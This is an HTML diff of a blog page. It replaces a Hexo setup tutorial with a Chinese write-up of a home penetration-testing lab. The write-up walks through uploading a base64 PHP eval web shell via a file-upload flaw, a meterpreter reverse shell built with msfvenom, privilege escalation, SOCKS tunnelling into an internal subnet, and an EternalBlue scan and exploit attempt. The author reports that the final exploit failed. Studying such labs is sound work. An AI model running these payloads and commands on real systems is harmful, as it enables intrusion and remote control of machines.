@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="hexo个人博客快速搭建, Wkai">
+    <meta name="keywords" content="记录一次内网渗透的实验, Wkai">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>hexo个人博客快速搭建 | Wkai</title>
+    <title>记录一次内网渗透的实验 | Wkai</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -201,12 +201,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(1).png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">hexo个人博客快速搭建</h1>
+                    <h1 class="description center-align post-title">记录一次内网渗透的实验</h1>
                 </div>
             </div>
         </div>
@@ -321,13 +321,9 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/hexo/">
-                                <span class="chip bg-color">hexo</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -335,8 +331,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" class="post-category">
-                                博客搭建
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                渗透测试
                             </a>
                         
                     </div>
@@ -348,7 +344,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-06-02
+                    2020-03-28
                 </div>
                 
 
@@ -364,29 +360,66 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h5 id="1-安装-Git-Bash"><a href="#1-安装-Git-Bash" class="headerlink" title="1. 安装 Git Bash"></a>1. 安装 Git Bash</h5><p>&emsp;Git官方网站 <a href="https://git-scm.com/downloads" target="_blank" rel="noopener">https://git-scm.com/downloads</a></p>
-<h5 id="2-安装-Node-js"><a href="#2-安装-Node-js" class="headerlink" title="2. 安装 Node js"></a>2. 安装 Node js</h5><p>&emsp;Node.js官方网站 <a href="http://nodejs.cn/" target="_blank" rel="noopener">http://nodejs.cn/</a></p>
-<h5 id="3-安装hexo"><a href="#3-安装hexo" class="headerlink" title="3. 安装hexo"></a>3. 安装hexo</h5><pre><code>npm install -g hexo
-npm install hexo-deployer-git --save</code></pre><h5 id="4-添加github账号和邮箱"><a href="#4-添加github账号和邮箱" class="headerlink" title="4. 添加github账号和邮箱"></a>4. 添加github账号和邮箱</h5><p>&emsp;首先在github中创建一个仓库，仓库格式为<strong>yourname.github.io</strong>，其中yourname为你的github账户名</p>
-<p>&emsp;然后在git终端里，添加你的github账号和注册的邮箱</p>
-<pre><code>git config --global user.name &quot;yourname&quot;
-git config --global user.email &quot;youremail&quot;</code></pre><h5 id="5-创建ssh"><a href="#5-创建ssh" class="headerlink" title="5. 创建ssh"></a>5. 创建ssh</h5><p>&emsp;在git终端中输入 ssh-keygen -t rsa -C “<a href="mailto:youremail@example.com">youremail@example.com</a><br>&emsp;生成ssh，然后在生成的信息中找到id_rsa.pub 的路径，找到胡将 id_rsa.pub 的内容复制到github的SSH keys里<br>&emsp;验证是否成功在终端中输入 ssh -T <a href="mailto:git@github.com">git@github.com</a></p>
-<h5 id="6-先介绍下hexo的一些命令"><a href="#6-先介绍下hexo的一些命令" class="headerlink" title="6. 先介绍下hexo的一些命令"></a>6. 先介绍下hexo的一些命令</h5><pre><code>hexo init #初始化博客内容，刚安装hexo需要的操作
-hexo clean #清理缓存文件
-hexo generate #生成静态文件
-hexo server #用于启动本地服务，测试用
-hexo deploy #部署网站
-hexo new &quot;news&quot; #新建文章</code></pre><h5 id="7-修改网站配置文件"><a href="#7-修改网站配置文件" class="headerlink" title="7. 修改网站配置文件"></a>7. 修改网站配置文件</h5><p>&emsp;打开博客根目录，找到 _config.yml</p>
-<pre><code>deploy:
-    type: git
-    repo: https://github.com/yourname/yournname.github.io.git</code></pre><h5 id="8-部署博客"><a href="#8-部署博客" class="headerlink" title="8. 部署博客"></a>8. 部署博客</h5><pre><code>hexo c
-hexo g
-hexo d
-
-或者
-
-hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code></pre><p>最后在浏览器中输入yourname.github.io就可以看到你的Blog了</p>
-<h5 id="9-小书匠绑定第三方数据和图床"><a href="#9-小书匠绑定第三方数据和图床" class="headerlink" title="9. 小书匠绑定第三方数据和图床"></a>9. 小书匠绑定第三方数据和图床</h5><p>&emsp;########################</p>
+                <p>实验是很久以前的，一直在笔记里放灰</p>
+<p>靶机里有两张网卡一张是NAT用来模拟外网，一张是仅限主机模式，用来模拟内网</p>
+<p>靶机上有个站点，可以通过外网访问</p>
+<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(5).png" alt></p>
+<p>看关于网站，可以得知网站是什么CMS</p>
+<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(8).png" alt></p>
+<p>可以找到上传点</p>
+<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard.png" alt></p>
+<p>随便上传一个文件，再抓包，发现可以改包上传其他文件</p>
+<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(7).png" alt></p>
+<p>我们上传一个一句话木马</p>
+<pre><code>data:image/php;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk/Pg==
+经过URL编码后：
+data%3Aimage%2Fphp%3Bbase64%2CPD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk%2FPg%3D%3D</code></pre><p>将更改后的包放出去</p>
+<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(3).png" alt></p>
+<p>显示虽然上传失败，但是其实是上传成功的</p>
+<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(11).png" alt></p>
+<p>用菜刀连接</p>
+<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(6).png" alt></p>
+<p>因为系统权限不够，做不了代理，所以需要上传另一个后门</p>
+<p>&emsp;先在kali用msfvenom生成反向连接后门</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.10.129  lport=12345 -f exe &gt;shell.exe</code></pre><p>&emsp;用菜刀上传该后门</p>
+<p>&emsp;kali开启监听</p>
+<pre><code>msfconsole
+use exploit/multi/handler
+set payload windows/windows/x64/meterpreter/reverse_tcp
+set lhost 192.168.10.129
+set lport 12345
+run</code></pre><p>&emsp;在菜刀终端中执行后门</p>
+<p>&emsp;获得meterpreter会话</p>
+<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(12).png" alt></p>
+<p>&emsp;绑定稳定进程</p>
+<pre><code>migrate 6912</code></pre><p>&emsp;查看权限</p>
+<pre><code>getuid</code></pre><p>&emsp;提升权限</p>
+<pre><code>getsystem</code></pre><p>&emsp;进入shell</p>
+<pre><code>shell</code></pre><p>&emsp;发现内网网段</p>
+<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(10).png" alt></p>
+<p>&emsp;接下来可以做代理，也可以做静态路由</p>
+<p>&emsp;那么就先试试做代理吧</p>
+<p>&emsp;kali先开启监听</p>
+<pre><code>./ew_for_linux -s rcsocks -e 8888 -l 1080</code></pre><p>&emsp;在靶机上</p>
+<pre><code>ew.exe -s rssocks -d 192.168.10.129 -e 88</code></pre><p>&emsp;成功连接</p>
+<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(2).png" alt></p>
+<p>&emsp;接下来就得使用代理工具proxychains了</p>
+<p>&emsp;需要使用代理在命令前加proxychains<br>&emsp;例如：proxychains msfconsole<br>&emsp;使用代理之后我们就可以访问内网了</p>
+<p>搜索内网中能使用ms17-010漏洞的主机</p>
+<pre><code>proxychains msfconsole
+search ms17-010
+use auxiliary/scanner/smb/smb_ms17_010
+set rhosts 10.10.10.130-10.10.10.135
+run</code></pre><p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(9).png" alt></p>
+<p>&emsp;那我们可以开始使用攻击模块了</p>
+<pre><code>use exploit/windows/smb/ms17_010_eternalblue
+set payload windows/x64/meterpreter/reverse_tcp
+set rhosts 10.10.10.133
+set lhost 192.168.10.10
+run</code></pre><p>&emsp;开始攻击</p>
+<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(1).png" alt></p>
+<p>&emsp;但是最后我没有成功，可能是虚拟机的问题，最后使用静态路由也没法成功，应该是虚拟机问题</p>
+<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(4).png" alt></p>
 
             </div>
             <hr/>
@@ -412,7 +445,7 @@ hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code></pre><p>最后在浏览器
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://wkaiblog.cn/2020/06/02/hexo_Blog_crate/">http://wkaiblog.cn/2020/06/02/hexo_Blog_crate/</a>
+                    <a href="http://wkaiblog.cn/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/">http://wkaiblog.cn/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -449,11 +482,7 @@ hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code></pre><p>最后在浏览器
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/hexo/">
-                                    <span class="chip bg-color">hexo</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -623,19 +652,21 @@ hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code></pre><p>最后在浏览器
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/06/02/linuxdeploy2/">
+                <a href="/2020/06/02/hexo_Blog_crate/">
                     <div class="card-image">
                         
-                        <img src="/2020/06/02/linuxdeploy2/1.png" class="responsive-img" alt="如何打造口袋里的渗透平台（一）">
                         
-                        <span class="card-title">如何打造口袋里的渗透平台（一）</span>
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="hexo个人博客快速搭建">
+                        
+                        <span class="card-title">hexo个人博客快速搭建</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            相信大家都玩过或者听过看门狗这款游戏，游戏里一位精通黑客技术的高手，于是他决定利用自己的特长来惩治全城的腐败分子，惩奸除恶。在游戏中他经常使用的作案工具就是一部手机，那么今天就教大家如何在安卓设备上安装KALI Linux渗透平台。
-这里先
+                            1. 安装 Git Bash&emsp;Git官方网站 https://git-scm.com/downloads
+2. 安装 Node js&emsp;Node.js官方网站 http://nodejs.cn/
+3. 安装hexonpm 
                         
                     </div>
                     <div class="publish-info">
@@ -646,8 +677,8 @@ hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code></pre><p>最后在浏览器
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%8A%98%E8%85%BE%E7%9E%8E%E6%90%9E/" class="post-category">
-                                    折腾瞎搞
+                            <a href="/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" class="post-category">
+                                    博客搭建
                                 </a>
                             
                             
@@ -657,8 +688,8 @@ hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code></pre><p>最后在浏览器
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/KALI/">
-                        <span class="chip bg-color">KALI</span>
+                    <a href="/tags/hexo/">
+                        <span class="chip bg-color">hexo</span>
                     </a>
                     
                 </div>
@@ -669,7 +700,7 @@ hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code></pre><p>最后在浏览器
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+                本篇&nbsp;<i class="far fa-dot-circle"></i>
             </div>
             <div class="card">
                 <a href="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/">
@@ -710,6 +741,7 @@ hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code></pre><p>最后在浏览器
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
